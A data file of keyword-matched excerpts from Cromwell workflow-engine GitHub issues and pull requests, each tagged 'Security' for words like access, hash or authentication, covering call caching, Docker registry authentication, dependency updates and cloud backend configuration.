""BamToUnmappedBams.input_bam"": ""gs://fc-4c1c7765-2de2-4214-ac41-dc10bbcbb55b/batch04/S64-2_Illumina.bam""; },; ""submission"": ""2017-01-19T18:17:12.188Z"",; ""status"": ""Failed"",; ""failures"": [{; ""message"": ""Google credentials are invalid: connect timed out""; }],; ""workflowLog"": ""gs://fc-4c1c7765-2de2-4214-ac41-dc10bbcbb55b/c7af7e0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1886:3396,Validat,ValidateSamFile,3396,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1886,1,['Validat'],['ValidateSamFile']
Security,""")). # Note: If you spot a mistake in this configuration sample, please let us know by making an issue at:; # https://github.com/broadinstitute/cromwell/issues. call-caching {; enabled = false; }. backend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; run-in-background = true; runtime-attributes = ""String? docker Int? max_runtime = 2""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". # Root directory where Cromwell writes job results. This directory must be; # visible and writeable by the Cromwell process as well as the jobs that Cromwell; # launches.; root: ""cromwell-executions"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path"". # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; # If false or the md5 does not exist, will proceed with the above-defined hashing strategy.; check-sibling-md5: false; }; }; }; }; }; }; }. database {; db.url = ""jdbc:mysql://mysql-db/cromwell_db?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true""; db.user = ""cromwell""; db.password = ""cromwell""; db.driver = ""com.mysql.cj.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; db.connectionTimeout = 15000; }; ```. and here is my cormwell dockerfile:. ```; FROM broadinstitute/cromwell:develop. RUN git clone https://github.com/vishnubob/wait-for-it.git; RUN mkdir cromwell-working-dir; WORKDIR cromwell-working-dir. COP",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7006:1827,hash,hash,1827,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7006,1,['hash'],['hash']
Security,"""; ## funcotator_excluded_fields: Annotations that should not appear in the output (VCF or MAF). Specified as <ANNOTATION>. For example: ""ClinVar_ALLELEID""; ## funco_filter_funcotations: If true, will only annotate variants that have passed filtering (. or PASS value in the FILTER column). If false, will annotate all variants in the input file. Default: true; ## funcotator_extra_args: Any additional arguments to pass to Funcotator. Default: """"; ##; ## Outputs :; ## - One VCF file and its index with primary filtering applied; secondary filtering and functional annotation if requested; a bamout.bam; ## file of reassembled reads if requested; ##; ## Cromwell version support; ## - Successfully tested on v34; ##; ## LICENSING :; ## This script is released under the WDL source code license (BSD-3) (see LICENSE in; ## https://github.com/broadinstitute/wdl). Note however that the programs it calls may; ## be subject to different licenses. Users are responsible for checking that they are; ## authorized to run all programs before running this script. Please see the docker; ## pages at https://hub.docker.com/r/broadinstitute/* for detailed licensing information; ## pertaining to the included programs. struct Runtime {; String gatk_docker; File? gatk_override; Int max_retries; Int preemptible; Int cpu; Int machine_mem; Int command_mem; Int disk; Int boot_disk_size; }. workflow Mutect2 {; input {; # Mutect2 inputs; File? intervals; File ref_fasta; File ref_fai; File ref_dict; File file_tumor_reads; Array[File] all_tumor_reads = read_lines(file_tumor_reads); File file_tumor_reads_indexes; Array[File] all_tumor_reads_indexes = read_lines(file_tumor_reads_indexes); Array[Pair[File,File]] tumor_reads_and_indexes = zip(all_tumor_reads,all_tumor_reads_indexes); File? normal_reads; File? normal_reads_index; File? pon; File? pon_idx; Int scatter_count; File? gnomad; File? gnomad_idx; File? variants_for_contamination; File? variants_for_contamination_idx; File? realignment_index_bundle; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5345:6266,authoriz,authorized,6266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5345,1,['authoriz'],['authorized']
Security,"""Pipeline"" Scopes are added only for ""Pipeline"" Credentials.; Otherwise scopes must be requested when asking for credentials.; `Credential` generator (vs. `Credentials`, the former an older API) still returns an unscoped Credential.; Renamed methods returning Credentials from `credential` to `credentials`.; Now also validating USA Credentials before returning.; Credentials lookups from workflow options are only done for ""Pipeline"" creds and tests.; Removed a `validate(WorkflowOptions)` that wasn't in use since commit 6fbeadc.; Removed scope declarations no longer in use.; Using scope-constants as-much-as-possible from the Google SDKs.; Added an `unsafe` to replace `toTry.get`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4054:318,validat,validating,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4054,2,['validat'],"['validate', 'validating']"
Security,"""Requester pays bucket access requires authentication"" when deploy cloud function",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5311:23,access,access,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5311,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"""This is not deemed to be a critical issue (yet) from a security perspective"". however. ""we should make sure to clear this up when we get a chance""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979#issuecomment-494152187:56,secur,security,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979#issuecomment-494152187,2,['secur'],['security']
Security,"# Introduction. The essence of a presigned URL is that it gives you privileged access to data (via HTTP verbs, usually `GET`) for a finite amount of time. Some metadata can be obtained via the `HEAD` verb. DOS URI's can be resolved to presigned URLs, and it's not immediately obvious how to provide the info Cromwell needs to do its job. Hence this document. The essence of this question is how do we leverage HTTP. # Information Needed for Cromwell to work. 1. The data itself, i.e. the file to which the URL refers.; 1. Size Metadata; 1. Hash Metadata; 1. Byte-level access (needed for things like WDL's `read_lines`). ## Information Provided by OpenDJ / Martha as of 6/25/18. * Size ; * MD5 Hash; * Presigned URL . ## Information provided by HTTP (in theory). * Metadata/ETag via `HEAD`; * Byte-level access via `RANGE` header on GET; * Full data of resource. ## Information *Not* Provided by OpenDJ/Martha as of 6/25/18. * Byte-level access; * CRC32 Hash. # Outstanding questions (please comment if you have info). 1. What metadata can be obtained via `HEAD`?; 1. Is the `HEAD` metadata a standard, and do all clouds implement that standard? (I think ETag is common name for this info.); 1. How does call-caching work with an expiration date on the URL?; 1. Byte-level access: HTTP request to the data can be limited to a range via [`Range` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests). Do clouds support this feature? Are there other ways of achieving this requirement?; 1. Write access: WDL supports `write_lines`, which AFAIK is only possible via `PATCH` ; 1. Can Cromwell use any hash besides CRC32? If not how do we obtain CRC32 reliably?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817:79,access,access,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817,10,"['Hash', 'access', 'hash']","['Hash', 'access', 'hash']"
Security,"# Proxy Support in Cromwell. Are proxies supported in Cromwell? . Cromwell fails to use remote hashing behind my corporate proxy. However, I can get this to work outside the proxy. While behind the proxy, Cromwell can still pull Docker images and local hashing works as these rely on the Docker daemon which does utilize my proxies. ## Exceptions. These are the exceptions that Cromwell is raising behind the proxy:; ```; Request method=GET uri=https://auth.docker.io/token?service=registry.docker.io&scope=repository%3Alibrary/debian%3Apull headers= threw an exception on attempt #4. Giving up.; java.net.ConnectException: Failed to connect to endpoint: RequestKey(Scheme(https),auth.docker.io); ```; ```; Docker lookup failed; java.lang.Exception: Failed to get docker hash for debian@sha256:75f7d0590b45561bfa443abad0b3e0f86e2811b1fc176f786cd30eb078d1846f Failed to connect to endpoint: RequestKey(Scheme(https),auth.docker.io); ```. ## Troubleshooting. I set my JVM proxies using the bash command ; ``` ; export _JAVA_OPTIONS='-Dhttp.proxyHost=proxy.myproxy.com -Dhttp.proxyPort=myport -Dhttps.proxyHost=proxy.myproxy.com -Dhttps.proxyPort=myport'; ```. And at the top of my cromwell logs I can see ; ```; Picked up _JAVA_OPTIONS: -Dhttp.proxyHost=proxy.myproxy.com -Dhttp.proxyPort=myport -Dhttps.proxyHost=proxy.myproxy.com -Dhttps.proxyPort=myport; ```. Of note, I have tried with and without the digest tag. Both are unsuccessful. . ## Cromwell Version. I am using cromwell 41.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5006:95,hash,hashing,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5006,3,['hash'],"['hash', 'hashing']"
Security,"## About this PR; 📦 Updates ; * [ch.qos.logback:logback-access](https://github.com/qos-ch/logback); * [ch.qos.logback:logback-classic](https://github.com/qos-ch/logback); * [ch.qos.logback:logback-core](https://github.com/qos-ch/logback). from `1.2.11` to `1.2.12`. ## Usage; ✅ **Please merge!**. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/57f91b22bf9b52c8cc7ea9474b188ac173019619/docs/repo-specific-configuration.md) file. _Have a fantastic day writing Scala!_. <details>; <summary>⚙ Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""ch.qos.logback"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""30 days"" },; dependency = { groupId = ""ch.qos.logback"" }; }]; ```; </details>. <sup>; labels: library-update, early-semver-patch, semver-spec-patch, commit-count:1; </sup>",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7260:56,access,access,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7260,1,['access'],['access']
Security,"## About this PR; 📦 Updates [com.eed3si9n:sbt-assembly](https://github.com/sbt/sbt-assembly) from `1.1.1` to `2.1.5` ⚠. 📜 [GitHub Release Notes](https://github.com/sbt/sbt-assembly/releases/tag/v2.1.5) - [Version Diff](https://github.com/sbt/sbt-assembly/compare/v1.1.1...v2.1.5). ## Usage; ✅ **Please merge!**. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/57f91b22bf9b52c8cc7ea9474b188ac173019619/docs/repo-specific-configuration.md) file. _Have a fantastic day writing Scala!_. <details>; <summary>🔍 Files still referring to the old version number</summary>. The following files still refer to the old version number (1.1.1).; You might want to review and update them manually.; ```; womtool/src/test/resources/validate/wdl_draft3/valid/arrays_v1/arrays_v1.inputs.json; ```; </details>; <details>; <summary>⚙ Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""com.eed3si9n"", artifactId = ""sbt-assembly"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""30 days"" },; dependency = { groupId = ""com.eed3si9n"", artifactId = ""sbt-assembly"" }; }]; ```; </details>. <sup>; labels: sbt-plugin-update, early-semver-major, semver-spec-major, old-version-remains, commit-count:1; </sup>",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7271:1024,validat,validate,1024,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7271,1,['validat'],['validate']
Security,"## About this PR; 📦 Updates [org.glassfish.jersey.inject:jersey-hk2](https://github.com/eclipse-ee4j/jersey) from `2.32` to `2.41`. 📜 [GitHub Release Notes](https://github.com/eclipse-ee4j/jersey/releases/tag/2.41) - [Version Diff](https://github.com/eclipse-ee4j/jersey/compare/2.32...2.41). ## Usage; ✅ **Please merge!**. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/57f91b22bf9b52c8cc7ea9474b188ac173019619/docs/repo-specific-configuration.md) file. _Have a fantastic day writing Scala!_. <details>; <summary>🔍 Files still referring to the old version number</summary>. The following files still refer to the old version number (2.32).; You might want to review and update them manually.; ```; project/Dependencies.scala; scripts/metadata_comparison/test/resources/comparer/papiv1_version3_good.json; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; scripts/metadata_comparison/test/resources/comparer/version3_comparison_good.csv; ```; </details>; <details>; <summary>⚙ Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""org.glassfish.jersey.inject"", artifactId = ""jersey-hk2"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""30 days"" },; dependency = { groupId = ""org.glassfish.jersey.inject"", artifactId = ""jersey-hk2"" }; }]; ```; </details>. <sup>; labels: library-update, old-version-remains, commit-count:1; </sup>",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7308:50,inject,inject,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7308,3,['inject'],['inject']
Security,"## Call-caching problems with path+modtime; I have been doing some call-caching benchmarking on the [BioWDL RNA-seq](https://github.com/biowdl/RNA-seq) pipeline and it turns out any `path` or `path+modtime` strategies do not work with containers. As is reported in these issues: #5405, #5370, #5346 . @cmarkello, @illusional, I am sorry that I insisted that `path+modtime` did work. I was using less complex workflows that did not have this problem at the time. ## Call-caching problems with file strategy; The `file` strategy does work as it uses md5sums in order to calculate the file hash. An unfortunate side effect of this is that md5 uses massive system resources. On HPC systems that are the target for the sfs-backend, this is a big problem. Cromwell will be run from a submit node on the system and greedily grab all processing power on the submit node to calculate all the md5sums. . ## Md5sums; Md5sums are reliable hashes for file integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:587,hash,hash,587,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,3,"['hash', 'integrity']","['hash', 'hashes', 'integrity']"
Security,"## Discussion \#1; ```; bshifaw [3:59 PM]; Hi Chris, ; The featured joint calling method is using NIO.; https://portal.firecloud.org/#methods/gatk/joint-discovery-gatk4/9/wdl; Is this the method you are referencing? (edited). bshifaw [4:28 PM]; @vdauwera, just confirmed with @jsoto. The wdl isn’t using NIO when importing the GVCFs. Due to a change in the wdl we decide to implement to best leverage the FC data model (using an array of input files instead of a sample name map file). (edited). Collapse; cwhelan [9:48 PM]; right, that’s the method i was using. vdauwera [11:22 PM]; oooh that’s an interesting case that would benefit from the flexible data models work — this would be great to show @andreah; ```. ## Discussion \#2. ```; cwhelan [11:17 AM]; ie it’s trying to localize each gvcf to each shard instance. tjeandet [11:17 AM]; do you have an idea of how many input files each shard has ?. Collapse; cwhelan [11:17 AM]; 555 samples; ```. # Takeaways. Run https://portal.firecloud.org/#methods/gatk/joint-discovery-gatk4/9/wdl in a non-production environment w/ 555 samples and try to reproduce issue w/ hashing timeouts. We predict they will not occur as cromwell production was seeing elevated CPU usage due to it's /stats endpoint being hit repeatedly.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3712:1116,hash,hashing,1116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3712,1,['hash'],['hashing']
Security,"## Motivation. A significant limitation of using the Google Backend on Cromwell today is that [only N* machine types](https://github.com/broadinstitute/cromwell/blob/develop/supportedBackends/google/batch/src/main/scala/cromwell/backend/google/batch/util/GcpBatchMachineConstraints.scala#L29-L32) can be used on GCP. In particular, N* machine types do not provide access to modern GPUs and users interested in running workflows on GPUs are limited to older NVIDIA T4 or V100 accelerators. ## Proposal. Add support for standard machine types, which would allow running workflows on a much broader range of machine types on GCP, including those configured with modern GPUs (e.g.: NVIDIA A100, H100). Related: https://github.com/broadinstitute/cromwell/issues/6558",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7535:364,access,access,364,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7535,1,['access'],['access']
Security,"## Today. Cromwell workers are deployed as a Terraform `instance,` most likely w/ a `count` of 1.*. ## What we want. ### # of instances. The `instance` stanza should reflect a minimum # of instances = `1`, max=`4`. The 1 represents the normal case where we want 1 Cromwell running, and only scales up when necessary. . ### Autoscaling. Should be set to `CPU Usage` where target == `50%`. Add an additional `group` stanza that creates a GCP instance group and refers to the Cromwell workers.*. *Raph Luckom made this presumption, the author does not have access to verify.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4798:554,access,access,554,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4798,1,['access'],['access']
Security,"## basic issue; `womtool validate` does not catch all scenarios where you are defining a new variable based on an optional variable. Instead, Cromwell fails at runtime -- even if it is actually impossible for that optional variable to be undefined. [A working example is available](https://github.com/aofarrel/myco/commit/e7f9ba6951d1b0fe5b3c1a650835312dd2b6e68f), but it is a complex WDL, so a more basic example is listed below. ## background; WDL doesn't really have a proper understanding of mutual exclusivity, so it doesn't realize that anything under a ""is optional variable X defined?"" block can only happen if optional variable X is defined. In other words, if variant_caller.errorcode has type Array[String?], the following code block is invalid, and womtool correctly flags it as such:. ```; if(defined(variant_caller.errorcode)) { ; 	Array[String] not_optional_error_code = variant_caller.errorcode; }; ```. > Failed to process declaration 'Array[String] varcall_error_if_earlyQC_filtered = variant_call_after_earlyQC_filtering.errorcode' (reason 1 of 1): Cannot coerce expression of type 'Array[String?]' to 'Array[String]'. The normal workaround for this is to use select_first() with a bogus fallback value, since the `defined` check means that fallback value will never be selected. ```; if(defined(variant_caller.errorcode)) { ; 	Array[String] not_optional_error_code = select_first([variant_caller.errorcode, [""according to all known laws of aviation""]]); }; ```. The same holds true if I only care about the first (index 0) variable in the array. That's the case for me, since the actual workflow I'm working on will be run on Terra data tables, eg each instance of the workflow only gets one sample but dozens of instances of the workflow will be created. For compatibility reasons I cannot convert the variant caller into a non-scattered task, so its error code will still have type Array[String]? even though that array will only have one value. ```; if(defined(variant_caller.er",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7194:25,validat,validate,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7194,1,['validat'],['validate']
Security,"### Description. <!-- What is the purpose of this change? What should reviewers know? -->; This change adds AWS ECR remote hashing support, which helps fix call caching for jobs using AWS ECR hosted containers. This change supports both private and public ECR registies. There were a couple non-standard behaviours from ECR which have been mitigated in this PR:; - Private ECR requires Basic authentication. The ability to override the authorization scheme for a particular registry was added.; - ECR does not return a `Docker-Content-Digest` header, so a fallback to calculate the image digest from the response body has been added.; - ECR supports images with no repository e.g. `123456790.dkr.ecr.eu-west-2.amazonaws.com/foo`. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [x] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [x] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7444:123,hash,hashing,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7444,3,"['authenticat', 'authoriz', 'hash']","['authentication', 'authorization', 'hashing']"
Security,"### Description. As part of preparing for the fall 2024 audit, we were asked to fix the permissions on the various healthcheck buckets such as `gs://cromwell-ping-me-dev`. It would have taken some tinkering to make sure the permissions are secure enough _and_ the healthcheck still works, so I decided to drop the healthcheck. I am not aware of any times it's helped us and doesn't pass the ""would we add this today"" test. The only notable bucket we'd want to make sure Cromwell itself has permissions on is the workflow archiver - and it uses [a separate service account from the rest of Cromwell](https://github.com/broadinstitute/terra-helmfile/blob/master/charts/cromwell/templates/config/_cromwell.conf.tpl#L267-L271), so it's not a valid test. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [x] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [x] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7533:56,audit,audit,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7533,2,"['audit', 'secur']","['audit', 'secure']"
Security,"### Description. Fixes CI failures caused by errors like:; ```; $ docker pull quay.io/broadinstitute/cromwell-docker-test:centaur; centaur: Pulling from broadinstitute/cromwell-docker-test; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of quay.io/broadinstitute/cromwell-docker-test:centaur to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. The very old images need to be updated to get around this. For Python, we can use a newer version. For the Quay image we manage, using a different one because I fear push access to the current one has been lost in the mists of time. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [ ] I updated `CHANGELOG.md` in this PR; - [X] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [X] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7450:755,access,access,755,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7450,1,['access'],['access']
Security,"### Description. UPDATE: issues with special characters in passwords appear to be resolved. PR to demo broken private Docker repo support in GCP Batch. There are actually multiple existing PAPI v2 Centaur tests in this vein; the one test enabled here for GCP Batch seems to be the simplest and demonstrates the issues clearly enough. The crux of this test is that the Docker image that is specified for the task is in a private repo to which the Centaur service account has been granted access. This test passes on PAPI v2 but on GCP Batch jobs fail with messages like the following visible in `gcloud batch jobs describe`:. ```; Job state is set from RUNNING to FAILED for job projects/1005074806481/locations/us-central1/jobs/job-27607753-d2d5-404d-89af-a786da8ad383.Job; failed due to task failure. Specifically, task with index 0 failed due to the; following task event: ""Task state is updated from RUNNING to FAILED on zones/us-central1-b/instances/8098872438472929780; with exit code 125."". ```. Exit code 125 being a typical ""[something's wrong with that Docker invocation](https://stackoverflow.com/questions/53640424/exit-code-125-from-docker-when-trying-to-run-container-programmatically)"" error. in Cloud Logging I see the following, including what looks like a plaintext password which I have x'd out below:. ```; Executing runnable container:{image_uri:""broadinstitute/cloud-cromwell@sha256:0d51f90e1dd6a449d4587004c945e43f2a7bbf615151308cff40c15998cc3ad4"" commands:""/mnt/disks/cromwell_root/script"" entrypoint:""/bin/bash"" volumes:""/mnt/disks/cromwell_root:/mnt/disks/cromwell_root"" username:""firecloud"" password:""xxxxx""} labels:{key:""tag"" value:""UserRunnable""} for Task task/job-27607753-d2d5-132dc052-df92-4db100-group0-0/0/0 in TaskGroup group0 of Job job-27607753-d2d5-132dc052-df92-4db100.; ```. So it looks like the GCP Batch backend has acquired and plumbed through the required Docker credentials, but the login to Docker Hub doesn't seem to have happened. ### Release Notes Confi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515:59,password,passwords,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515,2,"['access', 'password']","['access', 'passwords']"
Security,"### Description. We need to propagate the Google credentials while pulling metadata from private GCR repositories. This is likely fixes #7356. Before this change, we'd get a log error when cromwell tries pulling the metadata, this occurs because `GoogleRegistry` implementation does not have a valid auth token:. ```; [2024-06-28 01:14:19,56] [info] Assigned new job execution tokens to the following groups: 5fe16e0e: 1; [2024-06-28 01:14:20,38] [warn] BackendPreparationActor_for_5fe16e0e:myWorkflow.myTask:-1:1 [5fe16e0e]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for gcr.io/<REDACTED>/debian:latest Request failed with status 403 and body {""errors"":[{""code"":""DENIED"",""message"":""Unauthenticated request. Unauthenticated requests do not have permission \""artifactregistry.repositories.downloadArtifacts\"" on resource \""projects/<REDACTED>/locations/us/repositories/gcr.io\"" (or it may not exist)""}]}; ```. <details>; <summary>An example Workflow.wdl to test this</summary>. ```; workflow myWorkflow {; call myTask; }. task myTask {; command {; echo ""hello world""; }. runtime {; docker: ""gcr.io/<REDACTED>/debian:latest""; bootDiskSizeGb: 50; preemptible: 0; }; }; ```. </details>. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [x] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [ ] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7464:590,hash,hash,590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7464,1,['hash'],['hash']
Security,"### Motivation; The Job Manager UI is hoping to support a dashboard view, pictured below. We've heard from multiple users that this view would be very helpful to them. In addition, this capability is of especially high priority for our partners in this, Verily. Verily also needs to make changes to dsub to support this. ![image](https://user-images.githubusercontent.com/9449764/36913061-ae9bb686-1e16-11e8-9d8e-0f30eebc8dd6.png). ### What is it; This may be more information than you need, but I decided to err on providing more info over less. The dashboard view has panels of grouped information, categorized by labels on the jobs. Imagine a user had an owner label and a project label on all of their jobs. The dashboard panels would be pivoted by project and owner, and show probably the first ~5-10 labels that have the most running jobs with that label. These panels would be populated with a header that is the key of the cromwell label, a list of values that match that key that the users have access to, and then a summary of their statuses. . The dashboard will be filterable by other labels, but maybe not at first. A use case example there is filtering the image above by a label `key:value` of `flag:archived`. There is a concept of flagging jobs as archived so you don't see them anymore, as a way to get your failures list down to ""inbox 0"" and say ""I've addressed those jobs, I don't want to see them anymore"". So it's possible a user could want to filter those jobs out of their dashboard view as well. v1 will not have this chart pictured and will not have the left panel of server information. ### Ticket Prioritization Suggestions; 1. I would like to start with a spike/design doc and scoping out the amount of effort it would take to support this in Cromwell before end of Q1. ; 2. This ticket can also represent the implementation if Cromwell wants, which we need by end of May to be able to do the front end work before end of Q2. . ### Current Status; Currently, I think this",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3348:1004,access,access,1004,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3348,1,['access'],['access']
Security,"### What happened. On 10/10/2018, around 11:15 AM, there was a spike in backpressure and 403 copy failures. It was discovered that a user had submitted workflows attempting to access buckets it did not have access to. . ![image](https://user-images.githubusercontent.com/16748522/46764755-59087300-ccab-11e8-9163-afd953710adf.png); Purple line- backpressure; Light green line- 403 copy failures. ### What was done to fix it. The situation was discussed with the user, and once he aborted all his workflows, Cromwell slowly returned to its normal state. The issue was resolved around 1:50 PM. ### Potential causes. The user had reused a WDL from another user, but he didn't have access to their Google Cloud buckets. This workflow contained job that ran 5000 split intervals against dataset of approx 1300 samples. Each of the 5000 outputs would be copied, per workflow, per sample. Depending on the number of samples the other user had previously run, each interval-output-for-each-sample tried call caching to other user's workspace. This resulted in a lot of attempts to copy files and then failures.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4229:176,access,access,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4229,3,['access'],['access']
